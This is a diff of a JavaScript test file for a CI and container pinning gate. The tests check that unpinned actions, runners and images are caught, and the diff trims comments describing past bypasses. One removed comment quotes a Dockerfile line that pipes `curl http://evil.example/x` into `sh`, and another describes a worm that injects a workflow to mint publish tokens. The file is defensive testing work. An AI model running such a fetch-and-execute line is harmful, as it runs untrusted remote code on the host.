@@ -1,35 +1,11 @@
 #!/usr/bin/env node
 /**
  * Tests for the `ci-and-container-pinning` gate.
+ * Run with `node --test scripts/supply-chain/ci-pinning.test.mjs`.
  *
- * Run with:  node --test scripts/supply-chain/ci-pinning.test.mjs
- *
- * Before this gate existed, `uses: actions/cache@v4` added tomorrow passed all
- * eight supply-chain gates: nothing in `scripts/supply-chain/` read
- * `.github/workflows/` or the Dockerfiles at all, and the SHA-pinning rule was
- * held by a header comment. Every test below is a negative control on a shape
- * the repository forbids in prose, plus a positive control on the real files so
- * the gate cannot pass by never matching anything.
- *
- * ## Would these fail if the behaviour broke, and how was that checked?
- *
- * Each case was checked by breaking the function it covers and watching the
- * assertion fail. The two added with the recursive-discovery fix were checked the
- * same way:
- *
- *   * `discoverContainerFiles` was reverted to a non-recursive
- *     `readdirSync(root)` and "finds a compose file in a SUBDIRECTORY" failed
- *     with `[] deepEqual [ 'deploy/example/compose.yml' ]`.
- *   * `COMPOSE_NAME` was reverted to `/^docker-compose(\..+)?\.ya?ml$/` and
- *     "finds a Compose v2 filename" failed the same way.
- *   * `REQUIRED_INTERPOLATION` was widened to `/^\$\{.*\}$/` and "REFUSES an
- *     interpolation with a tag as its default" failed.
- *
- * The discovery tests use the EXPORTED walk rather than re-implementing it. A
- * test that re-implements the walk cannot catch a walk that stopped walking,
- * which is precisely the defect being fixed: the gate's own discovery was
- * non-recursive and the previous version of this file re-implemented it, so both
- * agreed, and both were blind to `deploy/staging/compose.yml`.
+ * Each case is a negative control on a shape the repo forbids, plus positive controls on the real
+ * files so the gate cannot pass by matching nothing. Discovery tests call the exported walk,
+ * because an earlier copy of the walk here shared the gate's blindness to nested compose files.
  */
 
 import assert from 'node:assert/strict';
@@ -69,8 +45,6 @@ describe('the repository as it stands', () => {
       judged += checkWorkflowPinning(gate, name, readFileSync(join(WORKFLOW_DIR, name), 'utf8'));
       assert.deepEqual(gate.failures, [], `${name}:\n${failureText(gate)}`);
     }
-    // If this ever drops to zero the gate has stopped finding `uses:` lines and
-    // would pass a workflow full of tags.
     assert.ok(judged > 10, `expected many action references, judged ${judged}`);
   });
 
@@ -99,9 +73,7 @@ describe('the repository as it stands', () => {
       assert.ok(judged > 0, `${name}: no image reference was judged`);
       composeImages += judged;
     }
-    // Six today: postgres and the proxy in each compose file, plus the two
-    // application images in the staging one. A floor, so that a discovery that
-    // silently found one file cannot pass this.
+    // Six today: postgres and the proxy in each compose file, plus two app images in staging.
     assert.ok(composeImages >= 6, `only ${composeImages} compose image reference(s) were judged`);
   });
 
@@ -114,8 +86,7 @@ describe('the repository as it stands', () => {
 
 describe('workflow inventory', () => {
   it('FAILS on an injected .github/workflows/codeql.yml', () => {
-    // A named campaign IOC: the worm adds a workflow whose name squats on one
-    // people expect, then uses it to mint publish tokens.
+    // A named campaign IOC.
     const gate = new Gate('t');
     checkWorkflowInventory(gate, [...EXPECTED_WORKFLOWS, 'codeql.yml']);
     assert.match(failureText(gate), /unexpected workflow file: \.github\/workflows\/codeql\.yml/);
@@ -198,8 +169,7 @@ describe('action pinning', () => {
   });
 
   it('does not read prose about an unpinned action as an unpinned action', () => {
-    // ci.yml's own header contains `uses: actions/checkout@v7` as an example of
-    // what not to write. A gate that fails on its own documentation gets deleted.
+    // ci.yml's own header quotes `uses: actions/checkout@v7`.
     const gate = new Gate('t');
     checkWorkflowPinning(
       gate,
@@ -219,18 +189,7 @@ describe('action pinning', () => {
     assert.match(failureText(gate), /service container is not digest-pinned/);
   });
 
-  // -------------------------------------------------------------------------
-  // The job-level `container:` shorthand
-  //
-  // The defect: the workflow check judged `image:` lines only. GitHub documents
-  // `jobs.<id>.container` as "a string or a map", and the string form writes the
-  // reference straight onto the `container:` line. Negative control, run against
-  // a scratch repository carrying the three declared workflows with everything
-  // else correctly pinned: `container: node:22` produced NO failures and exit 0,
-  // while the map form `container:` + `  image: node:22` failed correctly. The
-  // job container is what every step in the job executes inside.
-  // -------------------------------------------------------------------------
-
+  // The `container: node:22` shorthand once passed with exit 0 while the map form failed.
   it('FAILS on the job-level `container:` SHORTHAND, not just the `image:` map form', () => {
     const gate = new Gate('t');
     checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  a:\n    runs-on: ubuntu-24.04\n    container: node:22\n');
@@ -256,38 +215,14 @@ describe('action pinning', () => {
   });
 
   it('does not read a job NAMED `containers` as a container declaration', () => {
-    // ci.yml has a job called `containers:` and release.yml one called
-    // `container-scan:`. A check that fails on its own workflow's job names gets
-    // deleted, so this pins the exact-key match.
+    // ci.yml has a job named `containers:`.
     const gate = new Gate('t');
     checkWorkflowPinning(gate, 'ci.yml', 'jobs:\n  containers:\n    runs-on: ubuntu-24.04\n');
     assert.deepEqual(gate.failures, [], failureText(gate));
   });
 });
 
-// ---------------------------------------------------------------------------
-// YAML FLOW styles, which every reader in this file was blind to
-//
-// The defect: `uses:`, `runs-on:`, `image:` and `container:` are all read by
-// regexes anchored at `^\s*`, and YAML's flow mappings put a key anywhere on the
-// line. GitHub's parser accepts both. Measured against the exported checks, one
-// form per call, everything else in the workflow correctly pinned:
-//
-//     - uses: actions/checkout@v7                     FAIL, 1 judged
-//     - {uses: actions/checkout@v7}                   pass, 0 judged
-//     steps: [{uses: actions/checkout@v7}]            pass, 0 judged
-//     - uses: / newline / actions/checkout@v7         pass, 0 judged
-//     a: {runs-on: ubuntu-latest}                     pass, 0 declarations
-//     pg: {image: postgres:16}                        pass, 0 judged
-//
-// And nothing said so: the counts this file returns were a note, so the run
-// printed "1 workflow(s), 0 action reference(s)" and a green tick. Same class as
-// `FROM node AS node` below and as the `runs-on` spellings above.
-//
-// `checkNothingWasUnread` refuses a line carrying one of those four keys in a
-// shape the readers cannot see, rather than teaching four regexes to parse flow
-// YAML. Each row below was re-run against the fixed gate: all five now fail.
-// ---------------------------------------------------------------------------
+// YAML flow styles. Each of these once passed with 0 references judged.
 
 describe('keys the readers cannot see', () => {
   const unread = [
@@ -313,9 +248,6 @@ describe('keys the readers cannot see', () => {
   }
 
   it('does not fire on the block forms every real workflow uses', () => {
-    // The whole risk of this check is a false positive on the shapes the
-    // repository already writes. `runCiPinningGate` over the real files is the
-    // other half of this assertion and lives in the first describe block.
     const gate = new Gate('t');
     checkWorkflowPinning(
       gate,
@@ -330,8 +262,7 @@ describe('keys the readers cannot see', () => {
   });
 
   it('does not read `Base-image digest freshness` as an image key', () => {
-    // release.yml has a step by that name. A hyphen before `image` is not a YAML
-    // key boundary, and a gate that fails on its own step names gets deleted.
+    // release.yml has a step by that name.
     const gate = new Gate('t');
     checkWorkflowPinning(
       gate,
@@ -342,14 +273,7 @@ describe('keys the readers cannot see', () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// Local actions — the two-hop bypass
-//
-// `checkWorkflowPinning` clears `uses: ./…` because "a local action lives in this
-// repository and is reviewed with it". The gate then read `.github/workflows`
-// and nothing else, so `.github/actions/setup/action.yml` containing
-// `uses: actions/checkout@v7` passed the release audit having never been opened.
-// ---------------------------------------------------------------------------
+// A composite action with an unpinned `uses:` once passed because its file was never opened.
 
 describe('local action files', () => {
   it('discovers an action.yml anywhere but the skipped directories', () => {
@@ -373,38 +297,9 @@ describe('local action files', () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// `runs-on`, in every spelling GitHub accepts
-//
-// The defect: the check was `/^\s*runs-on:\s*(\S+)/` plus
-// `runner.endsWith('-latest')`, which reads ONE of five forms. Measured end to
-// end against a scratch repository carrying the three declared workflows with
-// everything else correctly pinned, one spelling per run:
-//
-//     runs-on: ubuntu-latest                              FAIL, exit 1
-//     runs-on: "ubuntu-latest"                            pass, exit 0
-//     runs-on: / - ubuntu-latest                          pass, exit 0
-//     runs-on: [ubuntu-latest]                            pass, exit 0
-//     runs-on: / group: default / labels: ubuntu-latest   pass, exit 0
-//     os: [ubuntu-latest] / runs-on: ${{ matrix.os }}     pass, exit 0
-//
-// One quote character disabled a release-blocking gate. The previous version of
-// this file fed the check only the first row, which is how it survived. Every
-// row is below, and each was re-run against the fixed gate: all six now exit 1.
-//
-// Do not "simplify" this back to a single regex.
-// ---------------------------------------------------------------------------
+// `runs-on` in every spelling GitHub accepts. A single regex once passed all but the plain scalar.
 
-/**
- * A GitHub Actions expression, spelled through a substitution.
- *
- * Same reason as `interpolation` further down: Biome's `noTemplateCurlyInString`
- * refuses a plain string containing this syntax and `noUnusedTemplateLiteral`
- * refuses a template literal without a substitution, so between them there is no
- * spelling for a literal `${'\u0024'}{{ … }}`. This repository has no
- * `biome-ignore` comments anywhere and a lint workaround would be a poor place
- * to add the first.
- */
+/** A GitHub Actions expression, built through a substitution for the same reason as `interpolation`. */
 const ghExpression = (body) => `\u0024{{ ${body} }}`;
 
 describe('runner pinning, in all five spellings of runs-on', () => {
@@ -496,10 +391,7 @@ describe('runner pinning, in all five spellings of runs-on', () => {
   }
 
   it('REFUSES to judge a runs-on it cannot resolve, rather than calling it pinned', () => {
-    // The whole class of defect here is a gate that reads nothing and reports a
-    // pass. An expression naming something outside the file makes "ubuntu-latest"
-    // and "ubuntu-24.04" indistinguishable from here, so it must not read as
-    // pinned. It is also reported exactly once, not once per branch.
+    // An expression naming something outside the file cannot be judged. Reported once, not per branch.
     const unresolvable = ['inputs.runner', 'vars.RUNNER', 'matrix.undefined-key'].map(ghExpression);
     for (const expression of unresolvable) {
       const gate = new Gate('t');
@@ -510,9 +402,7 @@ describe('runner pinning, in all five spellings of runs-on', () => {
   });
 
   it('FAILS on a runs-on it parsed into no labels at all', () => {
-    // A runner-group mapping with no `labels:` key: the group's membership is not
-    // in this file. Judging nothing and passing is what this check was rewritten
-    // to stop doing.
+    // A runner-group mapping with no `labels:` key.
     const gate = new Gate('t');
     checkWorkflowPinning(gate, 'ci.yml', job('    runs-on:', '      group: default'));
     assert.match(failureText(gate), /runs-on names no runner label at ci\.yml:\d+/);
@@ -525,8 +415,7 @@ describe('runner pinning, in all five spellings of runs-on', () => {
   });
 
   it('does not read prose about a floating runner as a floating runner', () => {
-    // release.yml's header contains the words `runs-on` in a sentence about this
-    // very rule.
+    // release.yml's header mentions `runs-on` in prose.
     const gate = new Gate('t');
     checkWorkflowPinning(
       gate,
@@ -552,9 +441,6 @@ describe('runner pinning, in all five spellings of runs-on', () => {
   });
 
   it('exposes the parse itself, so a spelling that stops matching is visible', () => {
-    // `parseRunsOn` is exported and counted in the gate's note for the same
-    // reason the discovery walk is: a parser that quietly stops matching is the
-    // failure this file exists to make loud.
     const declarations = parseRunsOn('jobs:\n  a:\n    runs-on: [x, "y"]\n  b:\n    runs-on:\n      - z\n');
     assert.deepEqual(
       declarations.map((d) => [d.line, d.labels]),
@@ -574,7 +460,6 @@ describe('runner pinning, in all five spellings of runs-on', () => {
   });
 
   it('judges every runs-on in the real workflows and finds a plausible number of them', () => {
-    // A floor, so that a parser that silently stopped matching cannot pass this.
     let declarations = 0;
     for (const name of listWorkflowFiles(WORKFLOW_DIR)) {
       declarations += parseRunsOn(readFileSync(join(WORKFLOW_DIR, name), 'utf8')).length;
@@ -622,23 +507,8 @@ describe('container base images', () => {
     assert.match(failureText(gate), /compose image is not digest-pinned/);
   });
 
-  // -------------------------------------------------------------------------
-  // A stage named after its own image
-  //
-  // The defect: `stages.add(stage)` ran BEFORE the "is this an earlier stage"
-  // test, so `FROM node AS node` registered `node` and then immediately matched
-  // it as an internal reference to itself. Negative control, run end to end
-  // against a scratch repository: a Dockerfile.api of `FROM node AS node` plus
-  // `RUN curl http://evil.example/x | sh`, every other file correctly pinned —
-  // the gate PASSED, exit 0. The only trace in the output was the note counting
-  // one fewer external base image, and `judged` was not incremented either, so
-  // no coverage counter could flag it. `docker build` resolves that FROM against
-  // the registry, so the bypass shipped a genuinely unpinned image.
-  //
-  // The previous tests used only distinct stage names, which is why they could
-  // not see it. Both orderings are asserted below: the shadowing case, and the
-  // legitimate case it must not break.
-  // -------------------------------------------------------------------------
+  // `FROM node AS node` once registered the stage before testing it, and passed an unpinned image
+  // with exit 0. Both the shadowing case and the legitimate one are asserted.
 
   it('FAILS on `FROM node AS node` — a stage named after its own image', () => {
     const gate = new Gate('t');
@@ -676,8 +546,7 @@ describe('container base images', () => {
   });
 
   it('accepts a stage that shadows an EARLIER stage of the same name', () => {
-    // `FROM node AS node` is only a bypass when `node` is not already a stage.
-    // Once it is, docker resolves it to the stage, and so does this.
+    // Once `node` is already a stage, docker resolves it to the stage, and so does this.
     const gate = new Gate('t');
     const judged = checkDockerfilePinning(
       gate,
@@ -696,21 +565,9 @@ describe('container base images', () => {
   });
 
   it('FAILS on a FROM that names no image, and says the file judged nothing', () => {
-    // Two things at once, both of them the same defect class:
-    //
-    //   * `image === ''` used to `continue` alongside the internal-stage case, so
-    //     a line the gate could not read was indistinguishable from one it had
-    //     cleared;
-    //   * and the coverage tripwire fires, because the FIRST FROM in a file can
-    //     never be an internal stage reference — no stage has been declared yet —
-    //     so "FROM lines present, zero external base images judged" is impossible
-    //     in a real Dockerfile.
-    //
-    // That tripwire is the guard against the `FROM node AS node` ordering defect
-    // coming back, and its failure mode WAS observed rather than assumed: with
-    // `stages.add()` moved back above the internal-stage test in a scratch copy,
-    // `FROM node AS node` produced `Dockerfile.api declares 1 FROM line(s) and no
-    // external base image` instead of the silent exit 0 it used to produce.
+    // A FROM the gate cannot read must not pass as cleared. The first FROM can never be a stage
+    // reference, so zero external images judged also fails. With the old stage ordering restored,
+    // this tripwire caught `FROM node AS node`.
     const gate = new Gate('t');
     const judged = checkDockerfilePinning(gate, 'Dockerfile.api', 'FROM --platform=linux/amd64\n');
     assert.equal(judged, 0);
@@ -719,22 +576,13 @@ describe('container base images', () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// Discovery
-//
-// The defect: `containerFiles()` did a NON-recursive `readdirSync(REPO_ROOT)`
-// matching `/^Dockerfile(\..+)?$/` and `/^docker-compose(\..+)?\.ya?ml$/`. A file
-// at `deploy/staging/compose.yml`, or one simply named `compose.yml`, matched
-// neither — so an `image: postgres:16` in it was not judged and allowed, it was
-// never read, and it passed all nine gates in silence.
-// ---------------------------------------------------------------------------
+// Discovery. A non-recursive walk once never read `deploy/staging/compose.yml` or `compose.yml`.
 
 const temporary = [];
 after(() => {
   for (const dir of temporary) rmSync(dir, { recursive: true, force: true });
 });
 
-/** A throwaway repository laid out the way the defect requires: nested, Compose v2. */
 function repoWithNestedComposeFile() {
   const root = mkdtempSync(join(tmpdir(), 'prl-pinning-'));
   temporary.push(root);
@@ -743,8 +591,7 @@ function repoWithNestedComposeFile() {
   mkdirSync(join(root, 'node_modules', 'someone-elses-package'), { recursive: true });
   writeFileSync(join(root, 'deploy', 'example', 'compose.yml'), 'services:\n  db:\n    image: postgres:16\n');
   writeFileSync(join(root, 'docker', 'Dockerfile.tools'), 'FROM alpine:3.20\n');
-  // A third-party Dockerfile inside node_modules is not this repository's to pin,
-  // and walking into the store would add thousands of files to every gate run.
+  // Third-party Dockerfiles are not ours to pin.
   writeFileSync(join(root, 'node_modules', 'someone-elses-package', 'Dockerfile'), 'FROM alpine:3.20\n');
   return root;
 }
@@ -766,8 +613,6 @@ describe('container-file discovery', () => {
   });
 
   it('does NOT walk into node_modules', () => {
-    // Otherwise every gate run judges third-party Dockerfiles this repository does
-    // not own and cannot pin, and the gate becomes noise.
     const { dockerfiles } = discoverContainerFiles(repoWithNestedComposeFile());
     assert.ok(
       dockerfiles.every((path) => !path.includes('node_modules')),
@@ -790,11 +635,7 @@ describe('container-file discovery', () => {
   });
 
   it('finds the SUFFIX naming convention, `api.Dockerfile`', () => {
-    // `DOCKERFILE_NAME` was anchored at the front (`/^Dockerfile(\..+)?$/`), so
-    // the other half of the convention matched nothing and was never opened.
-    // Measured: `discoverContainerFiles` on a scratch repo containing both
-    // returned only `["Dockerfile.api"]`, and the `FROM node` in
-    // `api.Dockerfile` passed the gate at exit 0.
+    // `DOCKERFILE_NAME` was anchored at the front, so `api.Dockerfile` with `FROM node` passed.
     const root = mkdtempSync(join(tmpdir(), 'prl-pinning-'));
     temporary.push(root);
     writeFileSync(join(root, 'api.Dockerfile'), 'FROM node\n');
@@ -814,21 +655,10 @@ describe('container-file discovery', () => {
   });
 });
 
-// ---------------------------------------------------------------------------
-// The one non-digest an `image:` may be
-// ---------------------------------------------------------------------------
-
 /**
- * A compose interpolation, spelled through a substitution rather than written out.
- *
- * Biome has two rules that disagree about this text. `noTemplateCurlyInString`
- * refuses a plain string containing the interpolation syntax, because that is
- * nearly always a template literal somebody forgot to mark. `noUnusedTemplateLiteral`
- * refuses a template literal with no substitution in it, because that should be a
- * plain string. Both are right in general, and together they leave no spelling for
- * a string that must genuinely contain compose's syntax. Building the opening
- * through one substitution satisfies both. The repository has no `biome-ignore`
- * comments anywhere and a lint workaround would be a poor place to add the first.
+ * A compose interpolation, built through a substitution. Biome's `noTemplateCurlyInString` refuses
+ * `${` in a plain string and `noUnusedTemplateLiteral` refuses a template literal with no
+ * substitution, which leaves no other spelling.
  */
 const interpolation = (body) => `\u0024{${body}}`;
 
@@ -863,17 +693,14 @@ describe('digest-bearing compose interpolation', () => {
   });
 
   it('reads the WHOLE value, not the first word', () => {
-    // The required message contains spaces, so a `\S+` capture judged only the
-    // fragment up to the first space — which happens to look unpinned — so this
-    // asserts the parse rather than the verdict.
+    // The message contains spaces; a `\S+` capture once judged only the first word.
     const gate = new Gate('t');
     checkComposePinning(gate, 'compose.yml', compose('postgres:16 with trailing words'));
     assert.match(failureText(gate), /postgres:16 with trailing words/);
   });
 
   it('does NOT extend the exception to a workflow service container', () => {
-    // GitHub Actions does not interpolate `${...}` the way compose does, so the
-    // same text there is a literal image name that resolves to nothing.
+    // GitHub Actions does not interpolate `${...}`, so this is a literal image name there.
     const gate = new Gate('t');
     checkWorkflowPinning(
       gate,
@@ -883,10 +710,6 @@ describe('digest-bearing compose interpolation', () => {
     assert.match(failureText(gate), /service container is not digest-pinned/);
   });
 });
-
-// ---------------------------------------------------------------------------
-// The freshness reporter's parser
-// ---------------------------------------------------------------------------
 
 describe('pinned-reference parsing', () => {
   const digest = `sha256:${'a'.repeat(64)}`;
@@ -908,8 +731,6 @@ describe('pinned-reference parsing', () => {
   });
 
   it('does not mistake a registry PORT for a tag', () => {
-    // `localhost:5000/x@sha256:...` has a colon that introduces a port, not a tag.
-    // Reading it as a tag would send the freshness reporter after `5000/x`.
     assert.deepEqual(parsePinnedReference(`localhost:5000/prl-api@${digest}`), {
       name: 'localhost:5000/prl-api',
       tag: null,
@@ -930,9 +751,7 @@ describe('pinned-reference parsing', () => {
 
   it('collects every pinned reference in the real repository, with where it was found', () => {
     const pinned = collectPinnedImages(REPO_ROOT);
-    // Three distinct base images today (node, postgres, nginx-unprivileged), each
-    // pinned in more than one place. A floor rather than an equality: adding an
-    // image must not fail this, but collecting nothing must.
+    // Three distinct base images today (node, postgres, nginx-unprivileged). A floor.
     assert.ok(pinned.length >= 3, `only ${pinned.length} pinned reference(s) were collected`);
     assert.ok(
       pinned.every((entry) => Array.isArray(entry.at) && entry.at.length > 0),
